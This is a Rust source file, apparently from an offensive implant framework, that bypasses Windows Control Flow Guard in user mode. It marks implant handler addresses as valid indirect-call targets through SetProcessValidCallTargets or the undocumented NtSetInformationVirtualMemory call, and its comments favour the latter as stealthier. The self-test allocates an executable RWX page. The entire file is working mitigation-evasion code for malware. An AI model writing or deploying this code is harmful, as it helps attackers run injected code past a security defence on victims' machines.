//! User-mode CFG (Control Flow Guard) bitmap extension — marks implant
//! code pages as valid indirect-call targets WITHOUT a kernel driver.
//!
//! # Why
//! CFG validates every indirect call/jump target against a per-process bitmap.
//! If the target isn't marked, the process terminates with
//! `STATUS_STACK_BUFFER_OVERRUN`. When using VEH proxy handlers or indirect
//! gadgets (`jmp rbx` in ntdll → implant handler), the implant handler's
//! address MUST be in the CFG bitmap.
//!
//! # Two paths
//! - **Documented**: `SetProcessValidCallTargets` (kernelbase.dll, Win10+)
//! - **Undocumented**: `NtSetInformationVirtualMemory` with
//!   `VmCfgCallTargetInformation` class (ntdll.dll) — stealthier, no
//!   kernelbase import
//!
//! # Safety
//! All user-mode, no kernel driver needed. Both APIs are callable from any
//! process. The undocumented path uses the same syscall FortiGuard
//! documented in their "Adding CFG Exceptions" research (2024).
//!
//! # Usage
//! ```text
//! // Mark the implant's VEH handler as CFG-valid so jmp rbx → handler works:
//! cfg_user::mark_addr_cfg_valid(handler_addr);
//! ```

#![cfg(target_os = "windows")]

use core::ffi::c_void;

// ---- Public API -----------------------------------------------------------

/// Mark `addr` as a valid CFG indirect-call target. Uses the documented
/// `SetProcessValidCallTargets` first, falls back to the undocumented
/// `NtSetInformationVirtualMemory` path.
///
/// Returns `true` on success, or if CFG is not enabled for this process
/// (non-fatal — the address works without CFG).
///
/// CRITICAL: The address MUST be 16-byte aligned. If `addr` is not aligned,
/// the offset is rounded down (the CFG bitmap granularity is 16 bytes).
///
/// # Safety
/// `addr` must be within a committed, private (MEM_PRIVATE) memory region.
/// Must run after PEB-walk bootstrap.
pub unsafe fn mark_addr_cfg_valid(addr: usize) -> bool {
    // Try the official API first (kernelbase.dll — Win10+).
    let spvct = crate::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets");
    if let Some(a) = spvct {
        if mark_std(addr, a) {
            return true;
        }
        // SetProcessValidCallTargets failed — fall through to NT path.
    }
    // Fall back to NT path.
    mark_nt(addr)
}

/// Mark multiple addresses within the same allocation region as CFG-valid.
/// More efficient than calling `mark_addr_cfg_valid` for each address
/// because it only queries the region once.
///
/// Returns the number of addresses successfully marked (0 = total failure).
///
/// # Safety
/// All addresses in `addrs` must be within the same committed private region.
/// Must run after PEB-walk bootstrap.
pub unsafe fn mark_addrs_cfg_valid(addrs: &[usize]) -> usize {
    if addrs.is_empty() {
        return 0;
    }
    // Resolve APIs once.
    let nt_query_vm = match crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") {
        Some(a) => a,
        None => return 0,
    };
    let nt_set_vm =
        match crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationVirtualMemory") {
            Some(a) => a,
            None => return 0,
        };

    // Query the region for the first address (all must be in same region).
    let (alloc_base, reg_size) = match query_region(nt_query_vm, addrs[0]) {
        Some(r) => r,
        None => return 0,
    };

    let mut marked: usize = 0;
    for &addr in addrs {
        let offset = (addr.wrapping_sub(alloc_base as usize)) & !0xF;
        if mark_single_nt(nt_set_vm, alloc_base, reg_size, offset) {
            marked += 1;
        }
    }
    marked
}

/// Check whether CFG is enabled for the current process.
/// Returns `true` if CFG is active (bitmap-based indirect-call validation).
///
/// Uses `GetProcessMitigationPolicy` if kernel32 is available, otherwise
/// probes by reading the CFG bitmap pointer from the PEB.
pub fn cfg_enabled() -> bool {
    // Fast path: try GetProcessMitigationPolicy via kernel32.
    let gpm = unsafe {
        crate::resolve::export_addr(b"kernelbase.dll", b"GetProcessMitigationPolicy")
            .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"GetProcessMitigationPolicy"))
    };
    if let Some(a) = gpm {
        type GpmFn = unsafe extern "system" fn(*mut c_void, u32, *mut c_void, usize) -> i32;
        let gpm_fn: GpmFn = unsafe { core::mem::transmute(a) };
        // ProcessControlFlowGuardPolicy = 8
        #[repr(C)]
        struct CfgPolicy {
            flags: u32,
        }
        let mut policy = CfgPolicy { flags: 0 };
        // Policy size = 4 for the flags field (the struct is larger but only flags matter).
        let st = unsafe {
            gpm_fn(
                -1isize as *mut c_void, // GetCurrentProcess pseudo-handle
                8,                      // ProcessControlFlowGuardPolicy
                &mut policy as *mut CfgPolicy as *mut c_void,
                4,
            )
        };
        if st != 0 {
            // Bit 0 = EnableControlFlowGuard
            return (policy.flags & 1) != 0;
        }
    }

    // Slow path: if the API isn't available (pre-Win10), CFG is off.
    false
}

// ---- Internal: Documented path (SetProcessValidCallTargets) ----------------

unsafe fn mark_std(addr: usize, spvct: usize) -> bool {
    let nt_query_vm = match crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") {
        Some(a) => a,
        None => return false,
    };
    let (alloc_base, reg_size) = match query_region(nt_query_vm, addr) {
        Some(r) => r,
        None => return false,
    };

    #[repr(C)]
    struct CfgCallTargetInfo {
        offset: usize,
        flags: usize,
    }

    type SpvctFn = unsafe extern "system" fn(
        *mut c_void,
        *const c_void,
        usize,
        u32,
        *const CfgCallTargetInfo,
    ) -> i32;
    let spvct_fn: SpvctFn = core::mem::transmute(spvct);

    let offset = (addr.wrapping_sub(alloc_base as usize)) & !0xF;
    let info = CfgCallTargetInfo { offset, flags: 1 }; // CFG_CALL_TARGET_VALID = 1
    let cur: *mut c_void = (-1isize) as *mut c_void;

    spvct_fn(cur, alloc_base, reg_size, 1, &info) != 0
}

// ---- Internal: Undocumented path (NtSetInformationVirtualMemory) -----------

unsafe fn mark_nt(addr: usize) -> bool {
    let nt_query_vm = match crate::resolve::export_addr(b"ntdll.dll", b"NtQueryVirtualMemory") {
        Some(a) => a,
        None => return false,
    };
    let nt_set_vm =
        match crate::resolve::export_addr(b"ntdll.dll", b"NtSetInformationVirtualMemory") {
            Some(a) => a,
            // If NtSetInformationVirtualMemory isn't resolvable, CFG probably
            // isn't relevant for this target. Non-fatal.
            None => return true,
        };

    let (alloc_base, reg_size) = match query_region(nt_query_vm, addr) {
        Some(r) => r,
        None => return false,
    };

    let offset = (addr.wrapping_sub(alloc_base as usize)) & !0xF;
    mark_single_nt(nt_set_vm, alloc_base, reg_size, offset)
}

/// Single-address mark via the NT path (reuses resolved set_vm address).
unsafe fn mark_single_nt(
    nt_set_vm: usize,
    alloc_base: *mut c_void,
    reg_size: usize,
    offset: usize,
) -> bool {
    #[repr(C)]
    struct CfgTargetInfo {
        offset: usize,
        flags: u32,
    }

    #[repr(C)]
    struct MemRegionEntry {
        virtual_address: *mut c_void,
        number_of_bytes: usize,
    }

    #[repr(C)]
    struct VmCfgInfo {
        number_of_entries: u32,
        _pad: u32,
        _z1: usize,
        _z2: usize,
        entry_ptr: *mut CfgTargetInfo,
        out_ptr: *mut u32,
    }

    type SetVmFn = unsafe extern "system" fn(
        *mut c_void,
        u32,
        usize,
        *mut MemRegionEntry,
        *mut VmCfgInfo,
        u32,
    ) -> i32;
    let set_fn: SetVmFn = core::mem::transmute(nt_set_vm);

    let mut cti = CfgTargetInfo { offset, flags: 1 };
    let mut mre = MemRegionEntry {
        virtual_address: alloc_base,
        number_of_bytes: reg_size,
    };
    let mut out: u32 = 0;
    let mut vmi = VmCfgInfo {
        number_of_entries: 1,
        _pad: 0,
        _z1: 0,
        _z2: 0,
        entry_ptr: &mut cti,
        out_ptr: &mut out,
    };

    // VmCfgCallTargetInformation = 4 (0x4)
    // InformationClass = 4 for the Set call
    let st = set_fn(
        (-1isize) as *mut c_void, // CurrentProcess
        4,                        // VmCfgCallTargetInformation
        1,                        // NumberOfMemRangeEntries
        &mut mre,
        &mut vmi,
        core::mem::size_of::<VmCfgInfo>() as u32,
    );
    // 0 = STATUS_SUCCESS, negative = error code.
    // STATUS_CFG_CALL_TARGET_ALREADY_VALID = 0xC0000413 → non-fatal.
    st >= 0
}

// ---- Internal: Memory region query ----------------------------------------

/// Query the allocation base and region size for `addr`.
/// Returns `Some((alloc_base, region_size))` if the region is committed private
/// memory (MEM_COMMIT | MEM_PRIVATE); `None` otherwise.
unsafe fn query_region(nt_query_vm: usize, addr: usize) -> Option<(*mut c_void, usize)> {
    #[repr(C)]
    struct MemBasicInfo {
        base: *mut c_void,
        alloc_base: *mut c_void,
        alloc_prot: u32,
        _p1: u32,
        reg_size: usize,
        state: u32,
        prot: u32,
        typ: u32,
        _p2: u32,
    }

    type QueryVmFn = unsafe extern "system" fn(
        *mut c_void,
        *const c_void,
        u32,
        *mut c_void,
        usize,
        *mut usize,
    ) -> i32;
    let query_fn: QueryVmFn = core::mem::transmute(nt_query_vm);

    let mut mbi = MemBasicInfo {
        base: core::ptr::null_mut(),
        alloc_base: core::ptr::null_mut(),
        alloc_prot: 0,
        _p1: 0,
        reg_size: 0,
        state: 0,
        prot: 0,
        typ: 0,
        _p2: 0,
    };
    let mut ret_len: usize = 0;

    if query_fn(
        (-1isize) as *mut c_void, // CurrentProcess
        addr as *const c_void,
        0, // MemoryBasicInformation
        &mut mbi as *mut MemBasicInfo as *mut c_void,
        core::mem::size_of::<MemBasicInfo>(),
        &mut ret_len,
    ) < 0
    {
        return None;
    }

    // MEM_COMMIT = 0x1000, MEM_PRIVATE = 0x20000
    if mbi.state != 0x1000 || mbi.typ != 0x20000 {
        return None;
    }

    Some((mbi.alloc_base, mbi.reg_size))
}

// ---- Selftest support -----------------------------------------------------

/// Self-test: verify CFG bypass works by marking a known address and checking
/// the NT return code. Used by `nyx_selftest_cfg`.
///
/// Returns:
/// - 0x80 = both paths failed
/// - 0x81 = documented path OK, NT path OK
/// - 0x82 = documented path failed, NT path OK
/// - 0x83 = documented path OK, NT path failed
/// - 0x84 = CFG not enabled (non-fatal skip)
pub fn selftest_cfg() -> u8 {
    // Allocate a small private page to test on.
    let va = match unsafe {
        crate::resolve::export_addr(b"kernelbase.dll", b"VirtualAlloc")
            .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc"))
    } {
        Some(a) => a,
        None => return 0x80,
    };
    type VAlloc = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
    let vaf: VAlloc = unsafe { core::mem::transmute(va) };
    let page = unsafe { vaf(core::ptr::null_mut(), 0x1000, 0x3000, 0x40) }; // RWX
    if page.is_null() {
        return 0x80;
    }
    let test_addr = page as usize;

    // Try standard path.
    let std_ok = if let Some(spvct) =
        unsafe { crate::resolve::export_addr(b"kernelbase.dll", b"SetProcessValidCallTargets") }
    {
        unsafe { mark_std(test_addr, spvct) }
    } else {
        false
    };

    // Try NT path.
    let nt_ok = unsafe { mark_nt(test_addr) };

    // Free the test page.
    let vf = match unsafe {
        crate::resolve::export_addr(b"kernelbase.dll", b"VirtualFree")
            .or_else(|| crate::resolve::export_addr(b"kernel32.dll", b"VirtualFree"))
    } {
        Some(a) => a,
        None => {
            return if std_ok || nt_ok { 0x83 } else { 0x80 };
        }
    };
    type VFree = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
    let vff: VFree = unsafe { core::mem::transmute(vf) };
    unsafe { vff(page, 0, 0x8000) }; // MEM_RELEASE

    match (std_ok, nt_ok) {
        (true, true) => 0x81,
        (false, true) => 0x82,
        (true, false) => 0x83,
        (false, false) => 0x80,
    }
}
